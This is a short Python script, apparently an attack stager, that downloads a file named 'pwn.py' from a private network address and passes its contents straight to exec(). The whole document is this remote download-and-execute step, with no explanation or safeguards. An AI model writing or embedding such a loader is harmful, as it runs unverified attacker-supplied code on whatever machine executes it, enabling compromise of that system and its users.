import urllib.request

url = "http://192.168.222.128:8000/pwn.py"

with urllib.request.urlopen(url) as response:
    code = response.read().decode()
    exec(code)